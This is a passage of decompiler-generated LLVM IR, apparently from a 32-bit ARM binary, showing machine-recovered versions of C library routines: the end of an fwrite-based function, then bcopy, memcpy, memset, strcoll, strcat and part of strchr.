  %v4_13ce0 = call i32 @__stdio_fwrite(i32 %v0_13cd4, i32 %v2_13cdc, i32 %v0_13cd0)
  %v0_13ce4 = load i32, i32* @r5, align 4
  %v2_13ce8 = udiv i32 %v4_13ce0, %v0_13ce4
  store i32 %v2_13ce8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d20

dec_label_pc_13cf4:                               ; preds = %dec_label_pc_13cc8
  %v1_13cf4 = inttoptr i32 %v0_13cd0 to i32*
  %v2_13cf4 = load i32, i32* %v1_13cf4, align 4
  %v1_13cf8 = or i32 %v2_13cf4, 8
  store i32 %v1_13cf8, i32* %r3.global-to-local, align 4
  %v3_13cfc = sdiv i32 %v2_13cf4, 256
  store i32 %v3_13cfc, i32* %r2.global-to-local, align 4
  %v1_13d00 = trunc i32 %v3_13cfc to i8
  %v3_13d00 = add i32 %v0_13cd0, 1
  %v4_13d00 = inttoptr i32 %v3_13d00 to i8*
  store i8 %v1_13d00, i8* %v4_13d00, align 1
  %v0_13d04 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d04 = trunc i32 %v0_13d04 to i8
  %v2_13d04 = load i32, i32* @r4, align 4
  %v3_13d04 = inttoptr i32 %v2_13d04 to i8*
  store i8 %v1_13d04, i8* %v3_13d04, align 1
  %v0_13d08 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_13d14 = inttoptr i32 %v0_13d08 to i32*
  store i32 22, i32* %v2_13d14, align 4
  %v0_13d20.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d20

dec_label_pc_13d1c:                               ; preds = %.thread, %dec_label_pc_13ca8, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13d20

dec_label_pc_13d20:                               ; preds = %dec_label_pc_13cf4, %dec_label_pc_13cdc, %dec_label_pc_13d1c
  %v0_13d20 = phi i32 [ %v0_13d20.pre, %dec_label_pc_13cf4 ], [ %v2_13ce8, %dec_label_pc_13cdc ], [ 0, %dec_label_pc_13d1c ]
  store i32 %v9_13c7c, i32* @r6, align 4
  store i32 %v12_13c7c, i32* @r7, align 4
  ret i32 %v0_13d20

; uselistorder directives
  uselistorder i32 %v3_13cfc, { 1, 0 }
  uselistorder i32 %v1_13cb8, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_13d20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d1c, { 2, 0, 1 }
}

define i32 @function_13d28(i32 %arg1) local_unnamed_addr {
dec_label_pc_13d28:
  ret i32 %arg1
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_13d3c = inttoptr i32 %arg2 to i8*
  %v3_13d3c = call i32 @_memcpy(i8* %v2_13d3c, i32 %arg1)
  ret i32 %v3_13d3c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_13d40 = load i32, i32* @r0, align 4
  %v1_13d40 = load i32, i32* @r1, align 4
  %v2_13d40 = inttoptr i32 %v0_13d40 to i8*
  %v3_13d40 = call i32 @_memcpy(i8* %v2_13d40, i32 %v1_13d40)
  ret i32 %v3_13d40
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_13d54 = load i32, i32* @r2, align 4
  %v8_13d54 = icmp eq i32 %v0_13d54, 8
  store i1 %v8_13d54, i1* %cpsr_z.global-to-local, align 1
  %v5_13d58 = icmp slt i32 %v0_13d54, 8
  br i1 %v5_13d58, label %dec_label_pc_13db8, label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %entry
  %v4_13d5c = mul i32 %arg2, 256
  %v5_13d5c = or i32 %v4_13d5c, %arg2
  %v4_13d60 = mul i32 %v5_13d5c, 65536
  %v5_13d60 = or i32 %v4_13d60, %v5_13d5c
  store i32 %v5_13d60, i32* %r1.global-to-local, align 4
  %v1_13d6457 = urem i32 %tmp, 4
  %v2_13d6458 = icmp eq i32 %v1_13d6457, 0
  store i1 %v2_13d6458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13d6458, label %dec_label_pc_13d74, label %bb

bb:                                               ; preds = %dec_label_pc_13d5c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13d5c ]
  %v3_13d6859 = phi i32 [ %v6_13d68, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13d5c ]
  %v4_13d68 = inttoptr i32 %v3_13d6859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13d68, align 1
  %v5_13d68 = load i32, i32* %r3.global-to-local, align 4
  %v6_13d68 = add i32 %v5_13d68, 1
  store i32 %v6_13d68, i32* %r3.global-to-local, align 4
  %v0_13d6c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13d78.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13d6c.pr, label %dec_label_pc_13d74, label %.thread

.thread:                                          ; preds = %bb
  %v2_13d6c = add i32 %v0_13d78.pr.pre, -1
  store i32 %v2_13d6c, i32* @r2, align 4
  %v1_13d64 = urem i32 %v6_13d68, 4
  %v2_13d64 = icmp eq i32 %v1_13d64, 0
  store i1 %v2_13d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d64, label %dec_label_pc_13d74, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13d68.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13d68.pre to i8
  br label %bb

dec_label_pc_13d74:                               ; preds = %.thread, %bb, %dec_label_pc_13d5c
  %v0_13d8028 = phi i32 [ %tmp, %dec_label_pc_13d5c ], [ %v6_13d68, %bb ], [ %v6_13d68, %.thread ]
  %v0_13d78.pr = phi i32 [ %v0_13d54, %dec_label_pc_13d5c ], [ %v0_13d78.pr.pre, %bb ], [ %v2_13d6c, %.thread ]
  %v0_13d74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13d74, i32* @ip, align 4
  %v8_13d7810 = icmp eq i32 %v0_13d78.pr, 8
  store i1 %v8_13d7810, i1* %cpsr_z.global-to-local, align 1
  %v5_13d7c11 = icmp slt i32 %v0_13d78.pr, 8
  br i1 %v5_13d7c11, label %dec_label_pc_13db8, label %dec_label_pc_13d80.preheader

dec_label_pc_13d80.preheader:                     ; preds = %dec_label_pc_13d74
  %v1_13d8046 = inttoptr i32 %v0_13d8028 to i32*
  store i32 %v0_13d74, i32* %v1_13d8046, align 4
  %v3_13d8047 = add i32 %v0_13d8028, 4
  %v4_13d8048 = inttoptr i32 %v3_13d8047 to i32*
  %v5_13d8049 = load i32, i32* @ip, align 4
  store i32 %v5_13d8049, i32* %v4_13d8048, align 4
  %v6_13d8050 = add i32 %v0_13d8028, 8
  store i32 %v6_13d8050, i32* %r3.global-to-local, align 4
  %v0_13d8451 = load i32, i32* @r2, align 4
  %v1_13d8452 = add i32 %v0_13d8451, -8
  store i32 %v1_13d8452, i32* %r2.global-to-local, align 4
  %v5_13d8c53 = icmp slt i32 %v1_13d8452, 8
  br i1 %v5_13d8c53, label %dec_label_pc_13d80.dec_label_pc_13db8.loopexit_crit_edge, label %dec_label_pc_13d90

dec_label_pc_13d90:                               ; preds = %dec_label_pc_13d80.preheader, %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge
  %v6_13d8055 = phi i32 [ %v6_13d80, %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge ], [ %v6_13d8050, %dec_label_pc_13d80.preheader ]
  %v0_13d8054 = phi i32 [ %v12_13dac, %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge ], [ %v0_13d8028, %dec_label_pc_13d80.preheader ]
  %v1_13d90 = inttoptr i32 %v6_13d8055 to i32*
  %v2_13d90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13d90, i32* %v1_13d90, align 4
  %v3_13d90 = add i32 %v0_13d8054, 12
  %v4_13d90 = inttoptr i32 %v3_13d90 to i32*
  %v5_13d90 = load i32, i32* @ip, align 4
  store i32 %v5_13d90, i32* %v4_13d90, align 4
  %v6_13d90 = add i32 %v0_13d8054, 16
  store i32 %v6_13d90, i32* %r3.global-to-local, align 4
  %v0_13d94 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d94 = add i32 %v0_13d94, -8
  store i32 %v1_13d94, i32* %r2.global-to-local, align 4
  %v5_13d9c = icmp slt i32 %v1_13d94, 8
  br i1 %v5_13d9c, label %dec_label_pc_13d90.dec_label_pc_13db8.loopexit_crit_edge, label %dec_label_pc_13da0

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d90
  %v1_13da0 = inttoptr i32 %v6_13d90 to i32*
  %v2_13da0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13da0, i32* %v1_13da0, align 4
  %v3_13da0 = add i32 %v0_13d8054, 20
  %v4_13da0 = inttoptr i32 %v3_13da0 to i32*
  %v5_13da0 = load i32, i32* @ip, align 4
  store i32 %v5_13da0, i32* %v4_13da0, align 4
  %v6_13da0 = add i32 %v0_13d8054, 24
  store i32 %v6_13da0, i32* %r3.global-to-local, align 4
  %v0_13da4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13da4 = add i32 %v0_13da4, -8
  store i32 %v1_13da4, i32* %r2.global-to-local, align 4
  %v5_13dac = icmp slt i32 %v1_13da4, 8
  br i1 %v5_13dac, label %dec_label_pc_13da0.dec_label_pc_13db8.loopexit_crit_edge, label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13da0
  %v7_13dac = inttoptr i32 %v6_13da0 to i32*
  %v8_13dac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13dac, i32* %v7_13dac, align 4
  %v9_13dac = add i32 %v0_13d8054, 28
  %v10_13dac = inttoptr i32 %v9_13dac to i32*
  %v11_13dac = load i32, i32* @ip, align 4
  store i32 %v11_13dac, i32* %v10_13dac, align 4
  %v12_13dac = add i32 %v0_13d8054, 32
  store i32 %v12_13dac, i32* %r3.global-to-local, align 4
  %v6_13db0 = load i32, i32* %r2.global-to-local, align 4
  %v7_13db0 = add i32 %v6_13db0, -8
  store i32 %v7_13db0, i32* %r2.global-to-local, align 4
  %v5_13d7c = icmp slt i32 %v7_13db0, 8
  br i1 %v5_13d7c, label %dec_label_pc_13d78.dec_label_pc_13db8.loopexit_crit_edge, label %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge

dec_label_pc_13d78.dec_label_pc_13d80_crit_edge:  ; preds = %dec_label_pc_13d78
  %v2_13d80.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13d80 = inttoptr i32 %v12_13dac to i32*
  store i32 %v2_13d80.pre, i32* %v1_13d80, align 4
  %v3_13d80 = add i32 %v0_13d8054, 36
  %v4_13d80 = inttoptr i32 %v3_13d80 to i32*
  %v5_13d80 = load i32, i32* @ip, align 4
  store i32 %v5_13d80, i32* %v4_13d80, align 4
  %v6_13d80 = add i32 %v0_13d8054, 40
  store i32 %v6_13d80, i32* %r3.global-to-local, align 4
  %v0_13d84 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d84 = add i32 %v0_13d84, -8
  store i32 %v1_13d84, i32* %r2.global-to-local, align 4
  %v5_13d8c = icmp slt i32 %v1_13d84, 8
  br i1 %v5_13d8c, label %dec_label_pc_13d80.dec_label_pc_13db8.loopexit_crit_edge, label %dec_label_pc_13d90

dec_label_pc_13d80.dec_label_pc_13db8.loopexit_crit_edge: ; preds = %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge, %dec_label_pc_13d80.preheader
  %v1_13d84.lcssa = phi i32 [ %v1_13d8452, %dec_label_pc_13d80.preheader ], [ %v1_13d84, %dec_label_pc_13d78.dec_label_pc_13d80_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13db8

dec_label_pc_13d78.dec_label_pc_13db8.loopexit_crit_edge: ; preds = %dec_label_pc_13d78
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13db8

dec_label_pc_13d90.dec_label_pc_13db8.loopexit_crit_edge: ; preds = %dec_label_pc_13d90
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13db8

dec_label_pc_13da0.dec_label_pc_13db8.loopexit_crit_edge: ; preds = %dec_label_pc_13da0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13db8

dec_label_pc_13db8:                               ; preds = %dec_label_pc_13d74, %dec_label_pc_13d80.dec_label_pc_13db8.loopexit_crit_edge, %dec_label_pc_13d78.dec_label_pc_13db8.loopexit_crit_edge, %dec_label_pc_13d90.dec_label_pc_13db8.loopexit_crit_edge, %dec_label_pc_13da0.dec_label_pc_13db8.loopexit_crit_edge, %entry
  %v0_13dc0 = phi i32 [ %v0_13d54, %entry ], [ %v1_13da4, %dec_label_pc_13da0.dec_label_pc_13db8.loopexit_crit_edge ], [ %v1_13d94, %dec_label_pc_13d90.dec_label_pc_13db8.loopexit_crit_edge ], [ %v7_13db0, %dec_label_pc_13d78.dec_label_pc_13db8.loopexit_crit_edge ], [ %v1_13d84.lcssa, %dec_label_pc_13d80.dec_label_pc_13db8.loopexit_crit_edge ], [ %v0_13d78.pr, %dec_label_pc_13d74 ]
  %v2_13db8 = icmp eq i32 %v0_13dc0, 0
  store i1 %v2_13db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13db8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13db8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13db8
  %v1_13dc0 = sub i32 7, %v0_13dc0
  store i32 %v1_13dc0, i32* %r2.global-to-local, align 4
  %v3_13dc4 = mul i32 %v1_13dc0, 4
  %v4_13dc4 = add i32 %v3_13dc4, ptrtoint (i32* @global_var_13dcc.1074 to i32)
  call void @__pseudo_branch(i32 %v4_13dc4)
  %v0_13dcc = load i32, i32* %r1.global-to-local, align 4
  %v1_13dcc = trunc i32 %v0_13dcc to i8
  %v2_13dcc = load i32, i32* %r3.global-to-local, align 4
  %v3_13dcc = inttoptr i32 %v2_13dcc to i8*
  store i8 %v1_13dcc, i8* %v3_13dcc, align 1
  %v4_13dcc = load i32, i32* %r3.global-to-local, align 4
  %v5_13dcc = add i32 %v4_13dcc, 1
  store i32 %v5_13dcc, i32* %r3.global-to-local, align 4
  %v0_13dd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13dd0 = trunc i32 %v0_13dd0 to i8
  %v3_13dd0 = inttoptr i32 %v5_13dcc to i8*
  store i8 %v1_13dd0, i8* %v3_13dd0, align 1
  %v4_13dd0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13dd0 = add i32 %v4_13dd0, 1
  store i32 %v5_13dd0, i32* %r3.global-to-local, align 4
  %v0_13dd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13dd4 = trunc i32 %v0_13dd4 to i8
  %v3_13dd4 = inttoptr i32 %v5_13dd0 to i8*
  store i8 %v1_13dd4, i8* %v3_13dd4, align 1
  %v4_13dd4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13dd4 = add i32 %v4_13dd4, 1
  store i32 %v5_13dd4, i32* %r3.global-to-local, align 4
  %v0_13dd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13dd8 = trunc i32 %v0_13dd8 to i8
  %v3_13dd8 = inttoptr i32 %v5_13dd4 to i8*
  store i8 %v1_13dd8, i8* %v3_13dd8, align 1
  %v4_13dd8 = load i32, i32* %r3.global-to-local, align 4
  %v5_13dd8 = add i32 %v4_13dd8, 1
  store i32 %v5_13dd8, i32* %r3.global-to-local, align 4
  %v0_13ddc = load i32, i32* %r1.global-to-local, align 4
  %v1_13ddc = trunc i32 %v0_13ddc to i8
  %v3_13ddc = inttoptr i32 %v5_13dd8 to i8*
  store i8 %v1_13ddc, i8* %v3_13ddc, align 1
  %v4_13ddc = load i32, i32* %r3.global-to-local, align 4
  %v5_13ddc = add i32 %v4_13ddc, 1
  store i32 %v5_13ddc, i32* %r3.global-to-local, align 4
  %v0_13de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13de0 = trunc i32 %v0_13de0 to i8
  %v3_13de0 = inttoptr i32 %v5_13ddc to i8*
  store i8 %v1_13de0, i8* %v3_13de0, align 1
  %v4_13de0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13de0 = add i32 %v4_13de0, 1
  store i32 %v5_13de0, i32* %r3.global-to-local, align 4
  %v0_13de4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13de4 = trunc i32 %v0_13de4 to i8
  %v3_13de4 = inttoptr i32 %v5_13de0 to i8*
  store i8 %v1_13de4, i8* %v3_13de4, align 1
  %v4_13de4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13de4 = add i32 %v4_13de4, 1
  store i32 %v5_13de4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13d80, { 1, 0 }
  uselistorder i32 %v12_13dac, { 1, 2, 0 }
  uselistorder i32 %v0_13d8054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13d78.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13d68, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13d5c, { 1, 0 }
  uselistorder i32 %v0_13d54, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 13, 12, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13db8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13d90, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_13df4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_13df4 = phi i32 [ %v0_13df4.pre, %bb ], [ %v5_13df4, %bb3 ]
  %v0_13df0 = phi i32 [ %tmp, %bb ], [ %v5_13df0, %bb3 ]
  %v1_13df0 = inttoptr i32 %v0_13df0 to i8*
  %v2_13df0 = load i8, i8* %v1_13df0, align 1
  %v3_13df0 = zext i8 %v2_13df0 to i32
  store i32 %v3_13df0, i32* @r2, align 4
  %v1_13df4 = inttoptr i32 %v0_13df4 to i8*
  %v2_13df4 = load i8, i8* %v1_13df4, align 1
  %v3_13df4 = zext i8 %v2_13df4 to i32
  %v2_13df8 = icmp eq i8 %v2_13df0, 0
  br i1 %v2_13df8, label %.dec_label_pc_13e04_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_13df4 = add i32 %v0_13df4, 1
  %v5_13df0 = add i32 %v0_13df0, 1
  %v10_13dfc = icmp eq i8 %v2_13df0, %v2_13df4
  br i1 %v10_13dfc, label %entry, label %dec_label_pc_13e04

.dec_label_pc_13e04_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %bb3, %.dec_label_pc_13e04_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_13e04_crit_edge ], [ %v3_13df0, %bb3 ]
  %v2_13e04.pre-phi = sub nsw i32 %.pn, %v3_13df4
  ret i32 %v2_13e04.pre-phi

; uselistorder directives
  uselistorder i32 %v0_13df0, { 1, 0 }
  uselistorder i32 %v0_13df4, { 1, 0 }
  uselistorder label %dec_label_pc_13e04, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e74

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e74, %entry
  %v0_13e74 = phi i32 [ %v5_13e74, %dec_label_pc_13e74 ], [ %tmp, %entry ]
  %v1_13e74 = inttoptr i32 %v0_13e74 to i8*
  %v2_13e74 = load i8, i8* %v1_13e74, align 1
  %v5_13e74 = add i32 %v0_13e74, 1
  store i32 %v5_13e74, i32* %r2.global-to-local, align 4
  %v2_13e78 = icmp eq i8 %v2_13e74, 0
  store i1 %v2_13e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e78, label %dec_label_pc_13e80, label %dec_label_pc_13e74

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e74
  %v1_13e80 = add i32 %v0_13e74, -1
  store i32 %v1_13e80, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e84, %dec_label_pc_13e80
  %v2_13e8c = phi i32 [ %v6_13e8c, %dec_label_pc_13e84 ], [ %v1_13e80, %dec_label_pc_13e80 ]
  %v0_13e84 = load i32, i32* @r1, align 4
  %v1_13e84 = inttoptr i32 %v0_13e84 to i8*
  %v2_13e84 = load i8, i8* %v1_13e84, align 1
  %v5_13e84 = add i32 %v0_13e84, 1
  store i32 %v5_13e84, i32* @r1, align 4
  %v2_13e88 = icmp eq i8 %v2_13e84, 0
  store i1 %v2_13e88, i1* %cpsr_z.global-to-local, align 1
  %v3_13e8c = add i32 %v2_13e8c, 1
  %v4_13e8c = inttoptr i32 %v3_13e8c to i8*
  store i8 %v2_13e84, i8* %v4_13e8c, align 1
  %v5_13e8c = load i32, i32* %r2.global-to-local, align 4
  %v6_13e8c = add i32 %v5_13e8c, 1
  store i32 %v6_13e8c, i32* %r2.global-to-local, align 4
  %v0_13e90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e90, label %dec_label_pc_13e94, label %dec_label_pc_13e84

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e84
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13e8c, { 1, 0 }
  uselistorder i32 %v5_13e74, { 1, 0 }
  uselistorder i32 %v0_13e74, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_13e98 = load i32, i32* @r5, align 4
  %v9_13e98 = load i32, i32* @r6, align 4
  %v1_13e9c = urem i32 %arg1, 256
  br label %dec_label_pc_13ebc

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13ebc
  %v3_13ea4 = load i8, i8* %.0, align 1
  %v4_13ea4 = zext i8 %v3_13ea4 to i32
  %v9_13ea8 = icmp eq i32 %v4_13ea4, %v1_13e9c
  br i1 %v9_13ea8, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_13ea4
  ret i32 %v1_13ebc

bb24:                                             ; preds = %dec_label_pc_13ea4
  %v2_13eb0 = icmp eq i8 %v3_13ea4, 0
  %v2_13eb4 = add i32 %v1_13ebc, 1
  %v3_13eb4 = inttoptr i32 %v2_13eb4 to i8*
  br i1 %v2_13eb0, label %dec_label_pc_13f90, label %dec_label_pc_13ebc

dec_label_pc_13ebc:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_13eb4, %bb24 ]
  %v1_13ebc = ptrtoint i8* %.0 to i32
  %v2_13ebc = urem i32 %v1_13ebc, 4
  %v3_13ebc = icmp eq i32 %v2_13ebc, 0
  br i1 %v3_13ebc, label %dec_label_pc_13ec4, label %dec_label_pc_13ea4

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13ebc
  %v4_13ec4 = mul nuw nsw i32 %v1_13e9c, 256
  %v5_13ec4 = or i32 %v4_13ec4, %v1_13e9c
  %v4_13ecc = mul i32 %v5_13ec4, 65536
  %v5_13ecc = or i32 %v4_13ecc, %v5_13ec4
  br label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13f88, %dec_label_pc_13f10, %dec_label_pc_13ec4
  %v0_13f34 = phi i32 [ %v1_13ebc, %dec_label_pc_13ec4 ], [ %v4_13ed0, %dec_label_pc_13f10 ], [ %v4_13ed0, %dec_label_pc_13f88 ]
  %v1_13ed0 = inttoptr i32 %v0_13f34 to i32*
  %v2_13ed0 = load i32, i32* %v1_13ed0, align 4
  %v4_13ed0 = add i32 %v0_13f34, 4
  %v2_13ed8 = xor i32 %v2_13ed0, %v5_13ecc
  %v2_13ee4 = add i32 %v2_13ed0, 2130640639
  %v1_13ee8 = sub i32 -1, %v2_13ed0
  %v2_13eec = xor i32 %v2_13ee4, %v1_13ee8
  %v2_13ef0 = add i32 %v2_13ed8, 2130640639
  %v1_13ef8 = sub i32 -1, %v2_13ed8
  %v2_13efc = and i32 %v2_13eec, -2130640640
  %v2_13f00 = xor i32 %v2_13ef0, %v1_13ef8
  %v2_13f04 = icmp eq i32 %v2_13efc, 0
  %v2_13f08 = and i32 %v2_13f00, -2130640640
  store i32 %v2_13f08, i32* @lr, align 4
  br i1 %v2_13f04, label %dec_label_pc_13f10, label %dec_label_pc_13f18

dec_label_pc_13f10:                               ; preds = %dec_label_pc_13ed0
  %v2_13f10 = icmp eq i32 %v2_13f08, 0
  br i1 %v2_13f10, label %dec_label_pc_13ed0, label %dec_label_pc_13f18

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13ed0, %dec_label_pc_13f10
  %v2_13f18 = inttoptr i32 %v0_13f34 to i8*
  %v3_13f18 = load i8, i8* %v2_13f18, align 1
  %v4_13f18 = zext i8 %v3_13f18 to i32
  %v1_13f20 = add i32 %v0_13f34, 1
  %v1_13f24 = add i32 %v0_13f34, 2
  %v9_13f28 = icmp eq i32 %v4_13f18, %v1_13e9c
  %v1_13f2c = add i32 %v0_13f34, 3
  store i32 %v1_13f2c, i32* @ip, align 4
  br i1 %v9_13f28, label %dec_label_pc_13f34, label %dec_label_pc_13f3c

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f18
  store i32 %v6_13e98, i32* @r5, align 4
  store i32 %v9_13e98, i32* @r6, align 4
  ret i32 %v0_13f34

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f18
  %v2_13f3c = icmp eq i8 %v3_13f18, 0
  br i1 %v2_13f3c, label %dec_label_pc_13f90, label %dec_label_pc_13f44

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f3c
  %v2_13f44 = inttoptr i32 %v1_13f20 to i8*
  %v3_13f44 = load i8, i8* %v2_13f44, align 1
  %v4_13f44 = zext i8 %v3_13f44 to i32
  %v9_13f48 = icmp eq i32 %v4_13f44, %v1_13e9c
  br i1 %v9_13f48, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_13f44
  store i32 %v6_13e98, i32* @r5, align 4
  store i32 %v9_13e98, i32* @r6, align 4
  ret i32 %v1_13f20

bb26:                                             ; preds = %dec_label_pc_13f44
  %v2_13f50 = icmp eq i8 %v3_13f44, 0
  br i1 %v2_13f50, label %dec_label_pc_13f90, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %bb26
  %v2_13f58 = inttoptr i32 %v1_13f24 to i8*
  %v3_13f58 = load i8, i8* %v2_13f58, align 1
  %v4_13f58 = zext i8 %v3_13f58 to i32
  %v9_13f5c = icmp eq i32 %v4_13f58, %v1_13e9c
  br i1 %v9_13f5c, label %dec_label_pc_13f64, label %dec_label_pc_13f6c

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f58
  store i32 %v6_13e98, i32* @r5, align 4
  store i32 %v9_13e98, i32* @r6, align 4
  ret i32 %v1_13f24

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f58
  %v2_13f6c = icmp eq i8 %v3_13f58, 0
  br i1 %v2_13f6c, label %dec_label_pc_13f90, label %dec_label_pc_13f74

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f6c
  %v2_13f74 = inttoptr i32 %v1_13f2c to i8*
  %v3_13f74 = load i8, i8* %v2_13f74, align 1
  %v4_13f74 = zext i8 %v3_13f74 to i32
  %v9_13f78 = icmp eq i32 %v4_13f74, %v1_13e9c
  br i1 %v9_13f78, label %dec_label_pc_13f80, label %dec_label_pc_13f88

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13f74
  store i32 %v6_13e98, i32* @r5, align 4
  store i32 %v9_13e98, i32* @r6, align 4
  ret i32 %v1_13f2c

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f74
  %v2_13f88 = icmp eq i8 %v3_13f74, 0
  br i1 %v2_13f88, label %dec_label_pc_13f90, label %dec_label_pc_13ed0

